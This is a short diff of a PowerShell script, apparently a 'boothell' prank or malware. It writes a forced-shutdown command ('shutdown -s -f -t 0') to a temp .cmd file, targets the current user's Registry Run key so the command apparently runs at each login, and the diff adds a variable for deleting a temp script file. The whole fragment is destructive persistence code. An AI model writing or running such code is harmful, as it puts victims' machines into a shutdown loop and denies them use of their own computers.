@@ -1,7 +1,7 @@
 $keyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\"
 $keyName = "Run"
 $filePath = $env:TMP + "\boothell.cmd"
-
+$fileToDelete = $env:TMP + "\temp.ps1"
 
 Set-Content -Path $filePath -Value "shutdown -s -f -t 0"
 
